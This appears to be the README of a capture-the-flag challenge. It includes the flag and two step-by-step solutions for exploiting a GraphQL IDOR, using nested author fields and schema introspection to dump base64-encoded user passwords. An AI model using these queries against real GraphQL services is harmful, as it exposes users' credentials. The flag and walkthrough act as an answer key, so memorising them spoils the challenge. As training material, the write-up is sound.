# PostbookSideDoor

This challenge is a GraphQL IDOR exploitation. The goal of this challenge is to find the flag, that is located in an exposed password field. Your goal is to find a GraphQL query endpoint that reveals the blog users passwords. One of these passwords has the challenge flag hidden inside of it.
# Flag

flag{WASNTTHISASHITSHOW}

# Description

Proposed difficulty: very easy

Are you a fan of blogging?

# Prerequisites & Outcomes

**Prerequisites**

* Knowledge of Web and GraphQL basics 
* Knowledge on how decoding works

**Outcomes**

* Experience with nested GraphQL objects
* Understanding how different queries refer to the same objects and fields

# Solutions

**Possible Solution 1**

1. Create an account with any name and password.
2. Once logged in, you can access the profile page from the navbar.
3. In the profile page the app tries to send a GraphQL query called GetUser, which you can find in the network tab.

```GraphQL
    query GetDetailedUserInfo($userId: Int!) {
        getUser(UserId: $userId) {
            id
            name
            hashedPassword
        }
    }
```

4. This query requires admin authentication, therefore the response will be "Unauthorized access to detailed user data"

```json
{
    "data": null,
    "errors": [
        {
            "message": "Unauthorized access to detailed user data",
            "locations": [
                {
                    "line": 3,
                    "column": 29
                }
            ],
            "path": [
                "getUser"
            ]
        }
    ]
}
```

5. Even though the response doesn't give anything, from the query itself you can figure out the that the user object has the field `hashedPassowrd`.

6. Now knowing the fields that the `User` object has, in the index page there is the GraphQL query called `getAllPosts` which returns an array of posts, which have the `author` field, which is a nested `User` object.

7. Query `getAllPosts` with the author argument containing the field hashedPassword.

```GraphQL
query GetAllPosts {
    getAllPosts {
        author {
            hashedPassword
        }
    }
}
```
Response:
```json
{
    "data": {
        "getAllPosts": [
            {
                "author": {
                    "hashedPassword": "Sm9obiBEb2U6c2VjcmV0"
                }
            },
            ...
```
4. Recognize that the passwords are not in fact hashed but encoded with base64.

5. Loop through each password by decoding it, until you find the flag:

Encoded flag: `QsO4cmdlIFNtw7hycmVicsO4ZHNlbjpmbGFne1dBU05UVEhJU0FTSElUU0hPV30=` => Decoded: `Børge Smørrebrødsen:flag{WASNTTHISASHITSHOW}`

**Possible Solution 2**

1. Open a tool where you can query GraphQL (like Postman), explore all the queries and fields with Through the GUI. Or send a query request like this:
```GraphQL
{
  __schema {
    types {
      name
      kind
    }
  }
}
```
This query will return all types that are in the schema

```json
{
    "data": {
        "__schema": {
            "types": [
                {
                    "name": "Query",
                    "kind": "OBJECT"
                },
                {
                    "name": "UserType",
                    "kind": "OBJECT"
                },

                {
                    "name": "PostType",
                    "kind": "OBJECT"
                },
                ...
            
```
2. From the query above, you can find that the `PostType ` exists. Which then can be explored in more detail by querying:
```GraphQL
{
  __type(name: "PostType") {
    name
    fields {
      name
      type {
        ofType {
          name
          kind
        }
      }
    }
  }
}
```
That returns:
```json
{
    "data": {
        "__type": {
            "name": "PostType",
            "fields": [

            ...

                {
                    "name": "author",
                    "type": {
                        "ofType": {
                            "name": "UserType",
                            "kind": "OBJECT"
                        }
                    }
                }
            ]
        }
    }
}

```
3. From the response, you can see that there is a clear relationship between the `PostType` and the `UserType` through the `author` field.
4. Now using this knowledge, query
`findAllPosts`, which has the `author` field that contains the encoded user passwords. 
5. Loop through the passwords, recognize that it's encoded with base64, decode it and find the flag (same as the solution above from step 4).

# How to run challenge locally
1. Populate the `.env.example` file with the environment variables and rename it to `.env`.
2. Make sure you have Docker Engine running.
3. Run the following command to start the challenge:
```bash
docker compose build --no-cache;
docker compose up -d;
```
4. The challenge should be running on `http://localhost:8080`.
